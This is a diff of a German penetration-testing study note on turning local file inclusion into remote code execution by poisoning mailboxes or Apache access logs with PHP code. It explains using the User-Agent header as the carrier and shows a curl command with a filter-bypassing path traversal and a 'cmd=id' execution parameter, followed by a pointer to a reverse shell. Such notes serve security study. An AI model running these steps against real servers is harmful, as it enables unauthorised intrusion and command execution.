@@ -4,7 +4,7 @@ aliases: [Log Poisoning, LFI to RCE]
 ---
 # Mail / Log Poisoning (LFI → RCE)
 
-> Eine Datei, die der Server später per [[Local File Inclusion|LFI]] einbindet, mit PHP-Code "vergiften". Beim Einbinden wird der Code ausgeführt => **RCE**.
+> Eine Datei, die der Server später per LFI einbindet, mit PHP-Code "vergiften". Beim Einbinden wird der Code ausgeführt => **RCE**.
 
 ## Prinzip
 1. Datei mit steuerbarem Inhalt wählen (Mailbox, Log).
@@ -28,7 +28,10 @@ QUIT
 > Server nimmt nur eigene Domains. Begrüßung verrät den echten Hostnamen → `user@localhost` oder `user@<hostname>` nehmen.
 
 ## Log als Träger (Apache access.log)
-Jeder HTTP-Request landet in `/var/log/apache2/access.log` (Ubuntu/Debian; RedHat/CentOS → `/var/log/httpd/`). Das letzte Feld ist der **`User-Agent`** – vom Client frei wählbar und ungeprüft geloggt → idealer Träger.
+Jeder HTTP-Request landet im Zugriffslog. Das letzte Feld ist der **`User-Agent`** – vom Client frei wählbar und ungeprüft geloggt → idealer Träger.
+
+> [!info] Welcher Logpfad?
+> Logpfade liegen je Server/OS **immer am selben Ort** → blind durchtesten. Vollständige Tabelle: [[Linux Standard-Pfade]]. Häufigster Treffer: `/var/log/apache2/access.log`.
 
 **(1)** PHP-Payload als User-Agent in den Log schreiben – [[curl]]:
 ```bash
@@ -61,4 +64,4 @@ curl -G "http://ziel/index.php" \
   --data-urlencode "page=....//....//var/mail/user" \
   --data-urlencode "cmd=id"
 ```
-=> Danach [[Reverse Shell]] für stabilen Zugang.
+=> Danach Reverse Shell für stabilen Zugang.
